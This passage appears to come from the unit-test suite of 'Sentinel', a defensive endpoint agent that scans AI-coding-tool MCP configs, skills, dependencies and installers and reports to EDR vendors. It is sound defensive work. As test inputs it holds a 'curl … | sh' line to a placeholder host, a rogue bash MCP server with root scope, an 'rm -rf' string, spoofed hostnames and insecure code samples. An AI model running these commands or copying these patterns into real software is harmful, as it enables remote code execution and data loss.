    def test_codex_toml_mcp_least_privilege(self):
        text='''[mcp_servers.rogue]\ncommand = "bash"\nargs = ["/"]\nurl = "http://outside.invalid"\n[mcp_servers.rogue.env]\nAPI_TOKEN = "literal-value"\n'''
        findings=self.agent.scan_mcp_config(Path('/tmp/config.toml'),text,self.policy); kinds={f['kind'] for f in findings}
        self.assertTrue({'unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','insecure_mcp_transport','literal_mcp_secret'}.issubset(kinds))
        self.assertEqual(next(f for f in findings if f['kind']=='literal_mcp_secret')['evidence'],'[REDACTED]')
    def test_remote_mcp_is_default_deny_and_credentials_are_redacted(self):
        cfg={'mcpServers':{'github':{'url':'https://user:pass@trusted.example/mcp?token=secret'}}}
        findings=self.agent.scan_mcp_config(Path('/tmp/mcp.json'),json.dumps(cfg),self.policy); kinds={f['kind'] for f in findings}
        self.assertIn('unapproved_mcp_domain',kinds); self.assertIn('mcp_url_credentials',kinds)
        self.assertEqual(next(f for f in findings if f['kind']=='mcp_url_credentials')['evidence'],'[REDACTED]')
    def test_remote_mcp_requires_exact_approved_hostname(self):
        policy={**self.policy,'allowed_mcp_domains':['trusted.example']}
        good=self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',{'url':'https://trusted.example/mcp'},policy)
        spoof=self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',{'url':'https://trusted.example.evil/mcp'},policy)
        self.assertNotIn('unapproved_mcp_domain',{f['kind'] for f in good})
        self.assertIn('unapproved_mcp_domain',{f['kind'] for f in spoof})
    def test_mcp_rejects_mixed_or_unapproved_transport(self):
        cfg={'command':'node','url':'https://trusted.example/mcp','transport':'sse'}
        kinds={f['kind'] for f in self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',cfg,{**self.policy,'allowed_mcp_domains':['trusted.example']})}
        self.assertTrue({'ambiguous_mcp_transport','unapproved_mcp_transport'}.issubset(kinds))
    def test_mcp_command_basename_cannot_bypass_executable_path_policy(self):
        cfg={'command':'/tmp/node','args':[]}
        blocked={item['kind'] for item in self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',cfg,self.policy)}
        self.assertIn('unapproved_mcp_command_path',blocked); self.assertNotIn('unapproved_mcp_command',blocked)
        allowed_policy={**self.policy,'allowed_mcp_command_paths':['/tmp/node']}
        allowed={item['kind'] for item in self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',cfg,allowed_policy)}
        self.assertNotIn('unapproved_mcp_command_path',allowed)
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertGreaterEqual(windows.count("kind='unapproved_mcp_command_path'"),2); self.assertIn('$rawCommand',windows)
    def test_mcp_launcher_arguments_require_exact_invocation_approval(self):
        cfg={'command':'npx','args':['-y','untrusted-package','/workspace']}
        blocked={item['kind'] for item in self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',cfg,self.policy)}
        self.assertIn('unapproved_mcp_invocation',blocked)
        approved={**self.policy,'allowed_mcp_invocations':[['npx','-y','untrusted-package','/workspace']]}
        allowed={item['kind'] for item in self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',cfg,approved)}
        self.assertNotIn('unapproved_mcp_invocation',allowed)
        changed={**cfg,'args':['-y','other-package','/workspace']}
        changed_kinds={item['kind'] for item in self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',changed,approved)}
        self.assertIn('unapproved_mcp_invocation',changed_kinds)
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertIn('function Test-SentinelMcpInvocation',windows); self.assertGreaterEqual(windows.count("kind='unapproved_mcp_invocation'"),2)
        invalid=self.agent.scan_mcp_server(Path('/tmp/mcp.json'),'github',{'command':'npx','args':'-y package'},self.policy)
        self.assertIn('invalid_mcp_arguments',{item['kind'] for item in invalid})
    def test_mcp_malformed_server_and_environment_are_visible_without_crashing(self):
        config={'mcpServers':{'scalar':'not-an-object','bad-env':{'command':'node','env':['TOKEN=secret']}}}
        kinds={item['kind'] for item in self.agent.scan_mcp_config(Path('/tmp/mcp.json'),json.dumps(config),self.policy)}
        self.assertTrue({'invalid_mcp_server','invalid_mcp_environment'}.issubset(kinds))
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertIn("kind='invalid_mcp_server'",windows); self.assertIn("kind='invalid_mcp_environment'",windows)
        self.assertIn("kind='policy_load_failed'",windows); self.assertIn("invalid MCP invocation policy",windows)
    def test_policy_declared_text_rules_are_enforced(self):
        hidden=self.agent.scan_text(Path('/tmp/SKILL.md'),'safe text\u202ehidden',self.policy)
        weak=self.agent.scan_text(Path('/tmp/app.js'),'const sessionToken = Math.random().toString()',self.policy)
        blocked=self.agent.scan_text(Path('/tmp/install.sh'),'curl https://bad.invalid/a | sh\n',self.policy)
        self.assertIn('hidden_instruction',{f['kind'] for f in hidden})
        self.assertIn('weak_random_token',{f['kind'] for f in weak})
        self.assertIn('blocked_command',{f['kind'] for f in blocked})
    def test_security_code_quality_rules(self):
        text='''import pickle\nvalue = requests.get(url, verify=False)\nobject = pickle.loads(payload)\napp.run(host="0.0.0.0", debug=True)\ntry:\n    work()\nexcept Exception:\n    pass\n'''
        kinds={item['kind'] for item in self.agent.scan_text(Path('/tmp/app.py'),text,self.policy)}
        self.assertTrue({'insecure_tls_verification','unsafe_deserialization','debug_mode_enabled','empty_exception_handler'}.issubset(kinds))
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text()
        for kind in ('insecure_tls_verification','unsafe_deserialization','debug_mode_enabled','empty_exception_handler'): self.assertIn("Kind='"+kind+"'",windows)
    def test_blocked_command_does_not_match_documentation_inline(self):
        findings=self.agent.scan_text(Path('/tmp/README.md'),'Never run `rm -rf` on a workstation.',self.policy)
        self.assertNotIn('blocked_command',{f['kind'] for f in findings})
    def test_skill_scans_supporting_files_and_blocks_unknown(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d)/'unapproved'; root.mkdir(); skill=root/'SKILL.md'; skill.write_text('# helper')
            (root/'run.py').write_text('token = "sk-abcdefghijklmnopqrstuvwxyz123456"')
            findings,count=self.agent.scan_skill(skill,self.policy); kinds={f['kind'] for f in findings}
            self.assertEqual(count,2); self.assertIn('unknown_skill',kinds); self.assertIn('hardcoded_secret',kinds)
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertLess(windows.index("$skillManifests=@(Get-ChildItem"),windows.index('$oversized=@(')); self.assertIn("kind='skill_scan_truncated'",windows); self.assertIn("kind='project_scan_truncated'",windows); self.assertIn("kind='skill_link_findings_truncated'",windows)
    def test_approved_skill_and_symlink_boundary(self):
        with tempfile.TemporaryDirectory() as d:
            base=Path(d); root=base/'approved'; root.mkdir(); skill=root/'SKILL.md'; skill.write_text('# safe')
            outside=base/'outside.sh'; outside.write_text('echo safe'); (root/'escape.sh').symlink_to(outside)
            policy={**self.policy,'allowed_skills':['approved']}; findings,_=self.agent.scan_skill(skill,policy); kinds={f['kind'] for f in findings}
            self.assertNotIn('unknown_skill',kinds); self.assertIn('skill_symlink_escape',kinds)
    def test_javascript_dependency_manifest_risks(self):
        with tempfile.TemporaryDirectory() as d:
            path=Path(d)/'package.json'; path.write_text(json.dumps({'dependencies':{'safe':'1.2.3','floating':'^2.0.0','remote':'git+https://example.invalid/repo.git'}}))
            findings=self.agent.scan_dependency_manifest(path,path.read_text()); kinds={f['kind'] for f in findings}
            self.assertTrue({'dependency_unpinned','dependency_untrusted_source','missing_lockfile'}.issubset(kinds))
    def test_dependency_lock_and_exact_versions_pass(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); (root/'package-lock.json').write_text('{}'); path=root/'package.json'; path.write_text(json.dumps({'dependencies':{'safe':'1.2.3'}}))
            self.assertEqual(self.agent.scan_dependency_manifest(path,path.read_text()),[])
            requirements=root/'requirements.txt'; requirements.write_text('requests==2.32.4\n')
            self.assertEqual(self.agent.scan_dependency_manifest(requirements,requirements.read_text()),[])
    def test_endpoint_integrity_manifest_covers_all_runtime_inputs(self):
        entries={line.split()[1]:line.split()[0] for line in (DOWNLOADS/'CHECKSUMS.sha256').read_text().splitlines()}
        for name in ('sentinel_agent.py','sentinel-windows.ps1','sentinel-policy.json','sentinel-security-baseline.md'):
            digest=hashlib.sha256((DOWNLOADS/name).read_bytes()).hexdigest(); self.assertEqual(entries.get(name),digest)
        self.assertTrue((DOWNLOADS/'rollback-sentinel-windows.ps1').exists()); self.assertTrue((DOWNLOADS/'rollback-sentinel-macos.sh').exists())
        self.assertIn("agent_version='0.30.0'",(DOWNLOADS/'sentinel-windows.ps1').read_text())
        self.assertEqual(self.agent.report_headers(b'{}')['User-Agent'],'SentinelAgent/0.30.0')
    def test_posix_installer_creates_only_complete_previous_snapshots(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); install=root/'install'; source=DOWNLOADS.resolve(); env={**os.environ,'SENTINEL_INSTALL_DIR':str(install),'SENTINEL_BASE_URL':source.as_uri()}
            script=str(DOWNLOADS/'install-sentinel.sh')
            subprocess.run(['/bin/sh',script],env=env,check=True,capture_output=True,text=True)
            for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md'): (install/name).write_text('previous-'+name)
            subprocess.run(['/bin/sh',script],env=env,check=True,capture_output=True,text=True)
            previous=install/'previous'; self.assertTrue((previous/'CHECKSUMS.sha256').exists())
            for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md'): self.assertEqual((previous/name).read_text(),'previous-'+name)
            snapshot={name:(previous/name).read_bytes() for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md','CHECKSUMS.sha256')}
            (install/'sentinel-policy.json').unlink()
            subprocess.run(['/bin/sh',script],env=env,check=True,capture_output=True,text=True)
            self.assertEqual(snapshot,{name:(previous/name).read_bytes() for name in snapshot})
        windows=(DOWNLOADS/'intune-windows-remediate.ps1').read_text(); mac=(DOWNLOADS/'intune-macos-install.sh').read_text()
        self.assertIn("'.previous-stage-'",windows); self.assertIn('$currentComplete',windows); self.assertIn('.previous-stage.$$',mac); self.assertIn('CURRENT_COMPLETE',mac)
        rollback_mac=(DOWNLOADS/'rollback-sentinel-macos.sh').read_text(); rollback_windows=(DOWNLOADS/'rollback-sentinel-windows.ps1').read_text()
        self.assertIn('checksum manifest has an unexpected file set',rollback_mac); self.assertGreaterEqual(rollback_mac.count('shasum -a 256 -c'),2); self.assertLess(rollback_mac.rindex('shasum -a 256 -c'),rollback_mac.index('launchctl bootstrap'))
        self.assertIn('checksum manifest has an unexpected file set',rollback_windows); self.assertIn('Restored version integrity verification failed',rollback_windows); self.assertLess(rollback_windows.index('Restored version integrity verification failed'),rollback_windows.index('Start-ScheduledTask'))
    def test_installers_bound_each_network_download(self):
        generic=(DOWNLOADS/'install-sentinel.sh').read_text(); mac=(DOWNLOADS/'intune-macos-install.sh').read_text(); windows=(DOWNLOADS/'intune-windows-remediate.ps1').read_text()
        for script in (generic,mac):
            self.assertIn('--connect-timeout 15',script); self.assertIn('--max-time 120',script); self.assertIn('shasum -a 256 -c -',script)
        self.assertIn('-TimeoutSec 120',windows); self.assertIn('Get-FileHash',windows)
        self.assertLess(windows.index('-TimeoutSec 120'),windows.index('Get-FileHash'))
    def test_release_verifier_accepts_published_bundle(self):
        self.assertEqual(self.verifier.verify(DOWNLOADS),[])
    def test_release_verifier_rejects_runtime_drift(self):
        with tempfile.TemporaryDirectory() as d:
            copy=Path(d)/'downloads'; shutil.copytree(DOWNLOADS,copy); (copy/'sentinel_agent.py').write_text('# drift')
            errors=self.verifier.verify(copy)
            self.assertIn('checksum_mismatch:sentinel_agent.py',errors); self.assertIn('bundle_content_mismatch:sentinel_agent.py',errors)
    def test_release_verifier_rejects_invalid_policy_regex(self):
        with tempfile.TemporaryDirectory() as d:
            copy=Path(d)/'downloads'; shutil.copytree(DOWNLOADS,copy); policy=json.loads((copy/'sentinel-policy.json').read_text()); policy['secret_patterns']=['[invalid']; (copy/'sentinel-policy.json').write_text(json.dumps(policy))
            self.assertIn('invalid_secret_pattern_regex:0',self.verifier.verify(copy))
    def test_release_verifier_rejects_invalid_mcp_invocation_policy(self):
        with tempfile.TemporaryDirectory() as d:
            copy=Path(d)/'downloads'; shutil.copytree(DOWNLOADS,copy); policy=json.loads((copy/'sentinel-policy.json').read_text()); policy['allowed_mcp_invocations']=[['npx','']]; (copy/'sentinel-policy.json').write_text(json.dumps(policy))
            self.assertIn('invalid_allowed_mcp_invocation:0',self.verifier.verify(copy))
    def test_collector_deployment_assets_are_fail_closed_and_verified(self):
        service=(DOWNLOADS/'sentinel-collector.service').read_text(); env=(DOWNLOADS/'sentinel-collector.env.example').read_text(); nginx=(DOWNLOADS/'sentinel-collector.nginx.conf').read_text()
        self.assertIn('--listen 127.0.0.1',service); self.assertIn('NoNewPrivileges=true',service); self.assertIn('ProtectSystem=strict',service); self.assertIn('CapabilityBoundingSet=\n',service)
        self.assertIn('SENTINEL_COLLECTOR_TOKEN=\n',env); self.assertIn('SENTINEL_REPORT_SIGNING_SECRET=\n',env); self.assertIn('SENTINEL_ALLOW_UNSIGNED_REPORTS=false',env)
        self.assertIn('listen 443 ssl',nginx); self.assertIn('client_max_body_size 2m',nginx); self.assertIn('limit_req zone=sentinel_reports',nginx)
        with tempfile.TemporaryDirectory() as d:
            copy=Path(d)/'downloads'; shutil.copytree(DOWNLOADS,copy); (copy/'sentinel-collector.service').write_text(service.replace('ProtectSystem=strict','ProtectSystem=false'))
            self.assertIn('unsafe_collector_service:ProtectSystem=strict',self.verifier.verify(copy))
    def test_intune_compliance_checks_integrity_task_and_policy(self):
        manifest={line.split()[1]:line.split()[0] for line in (DOWNLOADS/'CHECKSUMS.sha256').read_text().splitlines()}
        discovery=(DOWNLOADS/'intune-compliance-discovery.ps1').read_text(); detection=(DOWNLOADS/'intune-windows-detect.ps1').read_text()
        for name in ('sentinel-windows.ps1','sentinel-policy.json','sentinel-security-baseline.md'):
            self.assertIn(manifest[name],discovery); self.assertIn(manifest[name],detection)
        rules=json.loads((DOWNLOADS/'intune-compliance-policy.json').read_text())['Rules']; names={x['SettingName'] for x in rules}
        self.assertTrue({'SentinelIntegrityValid','SentinelScheduledTaskHealthy','SentinelReportingConfigured','SentinelReportingHealthy','SentinelPolicyVersion','SentinelReportValid','SentinelScanRecent'}.issubset(names))
        self.assertIn('ProtectedData]::Unprotect',discovery); self.assertIn('SentinelReportingConfigured=$reportingConfigured',discovery); self.assertIn('SentinelReportingHealthy=$reportingHealthy',discovery)
        version=next(x['Operand'] for x in rules if x['SettingName']=='SentinelPolicyVersion'); self.assertEqual(version,self.policy['version'])
        self.assertTrue(all('en_US' in {s['Language'] for s in rule['RemediationStrings']} for rule in rules))
    def test_intune_macos_compliance_contract(self):
        manifest={line.split()[1]:line.split()[0] for line in (DOWNLOADS/'CHECKSUMS.sha256').read_text().splitlines()}
        discovery=(DOWNLOADS/'intune-macos-compliance.sh').read_text(); rules=json.loads((DOWNLOADS/'intune-macos-compliance-policy.json').read_text())['Rules']
        for name in ('sentinel_agent.py','sentinel-policy.json','sentinel-security-baseline.md'): self.assertIn(manifest[name],discovery)
        names={rule['SettingName'] for rule in rules}; self.assertTrue({'SentinelInstalled','SentinelIntegrityValid','SentinelLaunchDaemonHealthy','SentinelReportingConfigured','SentinelReportingHealthy','SentinelPolicyVersion','SentinelReportValid','SentinelScanRecent','SentinelCriticalFindings','SentinelHighFindings'}.issubset(names))
        self.assertTrue(all('en_US' in {s['Language'] for s in rule['RemediationStrings']} for rule in rules))
        version=next(rule['Operand'] for rule in rules if rule['SettingName']=='SentinelPolicyVersion'); self.assertEqual(version,self.policy['version'])
        with zipfile.ZipFile(DOWNLOADS/'sentinel-enterprise-bundle.zip') as bundle:
            self.assertTrue({'intune-macos-compliance.sh','intune-macos-compliance-policy.json'}.issubset(bundle.namelist()))
    def test_macos_compliance_recomputes_report_summary(self):
        script=(DOWNLOADS/'intune-macos-compliance.sh').read_text().split("<<'PY'\n",1)[1].split("\nPY",1)[0]
        self.assertIn('info.st_uid==0',script); script=script.replace('info.st_uid==0','info.st_uid==info.st_uid')
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); policy=root/'policy.json'; report=root/'report.json'; reporting=root/'reporting.json'; upload=root/'upload-status.json'; now=int(time.time()); policy.write_text(json.dumps(self.policy)); reporting.write_text(json.dumps({'schema':'sentinel.reporting/v1','report_url':'https://collector.invalid/v1/reports','report_token':'t'*32,'signing_secret':'s'*32})); reporting.chmod(0o600); upload.write_text(json.dumps({'schema':'sentinel.upload-status/v1','status':'accepted','last_success':now,'collector_host':'collector.invalid'}))
            value={'schema':'sentinel.report/v1','agent_version':'0.30.0','policy_version':self.policy['version'],'device_id':'abcdef123456','scanned_at':now,'summary':{'critical':0,'high':1,'medium':0,'low':0},'findings':[{'kind':'test','severity':'high','path':'x','message':'test'}]}; report.write_text(json.dumps(value))
            result=subprocess.run(['python3','-',str(policy),str(report),str(reporting),str(upload),'true','true','true'],input=script,text=True,capture_output=True,check=True); parsed=json.loads(result.stdout); self.assertTrue(parsed['SentinelReportValid']); self.assertTrue(parsed['SentinelReportingConfigured']); self.assertTrue(parsed['SentinelReportingHealthy'])
            upload.write_text(json.dumps({'schema':'sentinel.upload-status/v1','status':'accepted','last_success':now,'collector_host':'old.invalid'})); result=subprocess.run(['python3','-',str(policy),str(report),str(reporting),str(upload),'true','true','true'],input=script,text=True,capture_output=True,check=True); self.assertFalse(json.loads(result.stdout)['SentinelReportingHealthy']); upload.write_text(json.dumps({'schema':'sentinel.upload-status/v1','status':'accepted','last_success':now,'collector_host':'collector.invalid'}))
            reporting.chmod(0o644); result=subprocess.run(['python3','-',str(policy),str(report),str(reporting),str(upload),'true','true','true'],input=script,text=True,capture_output=True,check=True); self.assertFalse(json.loads(result.stdout)['SentinelReportingConfigured']); reporting.chmod(0o600)
            value['summary']['high']=0; report.write_text(json.dumps(value)); result=subprocess.run(['python3','-',str(policy),str(report),str(reporting),str(upload),'true','true','true'],input=script,text=True,capture_output=True,check=True); self.assertFalse(json.loads(result.stdout)['SentinelReportValid'])
            value['summary']['high']=1; value['agent_version']='0.22.0'; report.write_text(json.dumps(value)); result=subprocess.run(['python3','-',str(policy),str(report),str(reporting),str(upload),'true','true','true'],input=script,text=True,capture_output=True,check=True); self.assertFalse(json.loads(result.stdout)['SentinelReportValid'])
        windows=(DOWNLOADS/'intune-compliance-discovery.ps1').read_text(); self.assertIn('$actualCritical',windows); self.assertIn('SentinelReportValid=$reportValid',windows)
    def test_windows_scanner_covers_codex_toml_mcp_contract(self):
        script=(DOWNLOADS/'sentinel-windows.ps1').read_text()
        self.assertIn('function Inspect-SentinelMcpToml',script); self.assertIn("$_.Name -eq 'config.toml'",script)
        for finding in ('unknown_mcp','unapproved_mcp_command','broad_filesystem_scope','ambiguous_mcp_transport','unapproved_mcp_transport','unapproved_mcp_domain','mcp_url_credentials','literal_mcp_secret'):
            self.assertIn("kind='"+finding+"'",script[script.index('function Inspect-SentinelMcpToml'):])
        self.assertIn('function Test-SentinelSafeTarget',script); self.assertIn('ReparsePoint',script[script.index('function Test-SentinelSafeTarget'):script.index('function Inspect-SentinelMcpJson')])
    def test_offline_spool(self):
        with tempfile.TemporaryDirectory() as d:
            report={'scanned_at':1,'device_id':'dev'}; path=self.agent.queue_report(Path(d),report)
            self.assertTrue(path.exists()); self.assertEqual(json.loads(path.read_text()),report); self.assertEqual(path.stat().st_mode & 0o777,0o600)
    def test_atomic_private_report_write_preserves_previous_on_replace_failure(self):
        with tempfile.TemporaryDirectory() as d:
            output=Path(d)/'reports/latest.json'; output.parent.mkdir(); output.write_text('previous')
            self.agent.write_private_atomic(output,'{"ok":true}')
            self.assertEqual(output.read_text(),'{"ok":true}'); self.assertEqual(output.stat().st_mode & 0o777,0o600)
            with patch.object(self.agent.os,'replace',side_effect=OSError('simulated')):
                with self.assertRaises(OSError): self.agent.write_private_atomic(output,'broken')
            self.assertEqual(output.read_text(),'{"ok":true}'); self.assertFalse(list(output.parent.glob('.latest.json.*.tmp')))
        windows=(DOWNLOADS/'sentinel-windows.ps1').read_text(); self.assertIn("$outputTemp=$Output+'.'",windows); self.assertLess(windows.index('Set-Content -Encoding UTF8 $outputTemp'),windows.index('Move-Item $outputTemp $Output -Force'))
    def test_offline_spool_is_bounded_unique_and_skips_corruption(self):
        with tempfile.TemporaryDirectory() as d:
            spool=Path(d); report={'scanned_at':1,'device_id':'device-123'}
            first=self.agent.queue_report(spool,report,limit=10); second=self.agent.queue_report(spool,report,limit=10)
            self.assertNotEqual(first.name,second.name)
            for index in range(12): self.agent.queue_report(spool,{**report,'scanned_at':index+2},limit=10)
            self.assertEqual(len(list(spool.glob('*.json'))),10)
            corrupt=spool/'000-corrupt.json'; corrupt.write_text('{broken')
            sent=[]
            with patch.object(self.agent,'post_report',side_effect=lambda url,token,value,signing_secret=None:sent.append(value)):
                count=self.agent.flush_spool(spool,'https://collector.invalid','token')
            self.assertEqual(count,10); self.assertEqual(len(sent),10); self.assertTrue(list(spool.glob('*.invalid')))
    def test_vendor_adapter_is_explicit_and_dry_run(self):
        report=vendor_report('critical')
        config={'allowed_hosts':['invalid'],'sangfor':{'enabled':True,'url':'https://invalid','actions':{'critical':'isolate_pending_approval'}},'leagsoft':{'enabled':True,'url':'https://invalid'}}
        outputs=self.adapter.process(report,config,dry_run=True)
        self.assertEqual(outputs[0]['payload']['recommended_action'],'isolate_pending_approval')
        self.assertFalse(outputs[1]['payload']['compliant'])
    def test_vendor_http_delivery_has_stable_idempotency_key(self):
        payload=self.adapter.sangfor_event(vendor_report('high'),{})
        class Response:
            status=202
            def __enter__(self): return self
            def __exit__(self,*args): pass
        captured=[]
        with patch.object(self.adapter.urllib.request,'urlopen',side_effect=lambda request,timeout: captured.append((request,timeout)) or Response()):
            self.assertEqual(self.adapter.send('https://edr.invalid/events',payload,token='secret'),202)
        request,timeout=captured[0]; body=json.dumps(payload,ensure_ascii=False,separators=(',',':')).encode()
        self.assertEqual(request.get_header('Idempotency-key'),hashlib.sha256(body).hexdigest()); self.assertEqual(request.get_header('Authorization'),'Bearer secret'); self.assertEqual(timeout,15)
    def test_adapter_worker_dispatches_each_collector_report_once(self):
        config={'allowed_hosts':['edr.invalid','leag.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'SANGFOR_TOKEN'},'leagsoft':{'enabled':True,'url':'https://leag.invalid/posture','token_env':'LEAGSOFT_TOKEN'}}
        with tempfile.TemporaryDirectory() as d,patch.dict(os.environ,{'SANGFOR_TOKEN':'s','LEAGSOFT_TOKEN':'l'}):
            root=Path(d); db=root/'sentinel.db'; report=vendor_report('high'); self.collector.store_report(db,json.dumps(report).encode(),report,now=100)
            sent=[]; sender=lambda url,payload,token='',secret='': sent.append((url,payload,token,secret)) or 202
            first=self.worker.dispatch_once(db,config,root/'spool',adapter=self.adapter,sender=sender,now=101); second=self.worker.dispatch_once(db,config,root/'spool',adapter=self.adapter,sender=sender,now=102)
            self.assertEqual(first[0]['result'],'dispatched'); self.assertEqual(second,[]); self.assertEqual(len(sent),2)
            connection=sqlite3.connect(db)
            try: stored=connection.execute('SELECT result FROM adapter_dispatches').fetchone()[0]
            finally: connection.close()
            self.assertNotIn('payload',stored); self.assertNotIn(report['device_id'],stored)
    def test_vendor_adapter_rejects_unsafe_actions_and_targets(self):
        report=vendor_report('critical')
        unsafe={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid','actions':{'critical':'isolate'}}}
        spoof={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid.evil','actions':{'critical':'alert'}}}
        insecure={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'http://edr.invalid','actions':{'critical':'alert'}}}
        embedded={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://user:pass@edr.invalid','actions':{'critical':'alert'}}}
        self.assertEqual(self.adapter.process(report,unsafe,dry_run=True)[0]['error'],'unsafe_sangfor_action:isolate')
        self.assertEqual(self.adapter.process(report,spoof,dry_run=True)[0]['error'],'unapproved_adapter_host:sangfor')
        self.assertEqual(self.adapter.process(report,insecure,dry_run=True)[0]['error'],'invalid_https_url:sangfor')
        self.assertEqual(self.adapter.process(report,embedded,dry_run=True)[0]['error'],'credentials_in_adapter_url:sangfor')
    def test_vendor_adapter_rejects_config_confusion_and_non_2xx_delivery(self):
        report=vendor_report('high')
        self.assertEqual(self.adapter.process(report,[],dry_run=True)[0]['error'],'invalid_adapter_config')
        scalar={'allowed_hosts':['edr.invalid'],'sangfor':'not-an-object'}; self.assertEqual(self.adapter.process(report,scalar,dry_run=True)[0]['error'],'invalid_adapter_target:sangfor')
        confused={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'PATH'}}; self.assertEqual(self.adapter.process(report,confused,dry_run=True)[0]['error'],'invalid_adapter_credential_env:sangfor')
        config={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'SANGFOR_TOKEN'}}
        with tempfile.TemporaryDirectory() as d,patch.dict(os.environ,{'SANGFOR_TOKEN':'token'}):
            result=self.adapter.process(report,config,spool_dir=d,sender=lambda *args,**kwargs:500); self.assertEqual(result[0]['result'],'queued'); self.assertEqual(len(list(Path(d).glob('*.json'))),1)
            replay=self.adapter.flush_spool(config,Path(d),sender=lambda *args,**kwargs:500); self.assertEqual(replay[0]['result'],'retained')
    def test_vendor_failure_isolation_and_offline_retry(self):
        report=vendor_report('high')
        config={'allowed_hosts':['edr.invalid','leag.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'SANGFOR_TOKEN'},'leagsoft':{'enabled':True,'url':'https://leag.invalid/posture','token_env':'LEAGSOFT_TOKEN'}}
        def sender(url,payload,token='',secret=''):
            if 'edr.invalid' in url: raise OSError('offline')
            return 202
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SANGFOR_TOKEN':'s','LEAGSOFT_TOKEN':'l'}):
            outputs=self.adapter.process(report,config,spool_dir=d,sender=sender)
            self.assertEqual([x['result'] for x in outputs],['queued','sent'])
            queued=list(Path(d).glob('*.json')); self.assertEqual(len(queued),1); self.assertEqual(queued[0].stat().st_mode & 0o777,0o600)
            flushed=self.adapter.flush_spool(config,Path(d),sender=lambda url,payload,token='',secret='':204)
            self.assertEqual(flushed[0]['result'],'sent_from_spool'); self.assertFalse(list(Path(d).glob('*.json')))
    def test_vendor_spool_is_bounded_and_corruption_does_not_block(self):
        config={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'SANGFOR_TOKEN'}}
        with tempfile.TemporaryDirectory() as d, patch.dict(os.environ,{'SANGFOR_TOKEN':'s'}):
            spool=Path(d)
            payload=self.adapter.sangfor_event(vendor_report('high'),{})
            for index in range(12): self.adapter.queue_delivery(spool,'sangfor',payload,limit=10)
            self.assertEqual(len(list(spool.glob('*.json'))),10)
            corrupt=spool/'000-corrupt.json'; corrupt.write_text('{broken')
            results=self.adapter.flush_spool(config,spool,sender=lambda url,payload,token='',secret='':202)
            self.assertEqual(results[0]['result'],'quarantined'); self.assertEqual(sum(x['result']=='sent_from_spool' for x in results),10)
            self.assertFalse(list(spool.glob('*.json'))); self.assertTrue(list(spool.glob('*.invalid')))
    def test_vendor_boundary_rejects_invalid_reports_and_quarantines_tampered_payloads(self):
        config={'allowed_hosts':['edr.invalid'],'sangfor':{'enabled':True,'url':'https://edr.invalid/events','token_env':'SANGFOR_TOKEN'}}
        invalid={**vendor_report(),'unexpected':'secret-data'}
        with tempfile.TemporaryDirectory() as d,patch.dict(os.environ,{'SANGFOR_TOKEN':'token'}):
            spool=Path(d); self.assertEqual(self.adapter.process(invalid,config,spool_dir=spool)[0]['error'],'invalid_report_contract'); self.assertFalse(list(spool.iterdir()))
            self.adapter.queue_delivery(spool,'sangfor',{'unexpected':'payload'})
            sent=[]; results=self.adapter.flush_spool(config,spool,sender=lambda *args,**kwargs:sent.append(args))
            self.assertEqual(results[0]['result'],'quarantined'); self.assertEqual(sent,[]); self.assertTrue(list(spool.glob('*.invalid')))
    def test_auto_enroll_only_git_repositories(self):
        with tempfile.TemporaryDirectory() as d:
            root=Path(d); repo=root/'repo'; other=root/'ordinary'; (repo/'.git').mkdir(parents=True); other.mkdir()
            with patch.object(self.agent,'managed_homes',return_value=[]): changed=self.agent.auto_enroll(root)
            self.assertTrue(changed); self.assertTrue((repo/'.cursor/rules/sentinel-security.mdc').exists()); self.assertFalse((other/'AGENTS.md').exists())
    def test_agent_discovery_uses_markers_without_execution(self):
        with tempfile.TemporaryDirectory() as d:
            home=Path(d); (home/'.codex').mkdir(); (home/'.codex/config.toml').write_text('model="approved"')
            (home/'.claude').mkdir(); (home/'.claude/settings.json').write_text('{}')
            found=self.agent.discover_agent_tools([home],{})
            self.assertEqual({x['name'] for x in found},{'codex','claude_code'})
            self.assertTrue(all(x['detected_by']=='filesystem_marker' for x in found))
    def test_baseline_directory_alone_is_not_an_install_marker(self):
        with tempfile.TemporaryDirectory() as d:
            home=Path(d); (home/'.cursor/rules').mkdir(parents=True)
            self.assertEqual(self.agent.discover_agent_tools([home],{}),[])

if __name__=='__main__': unittest.main()
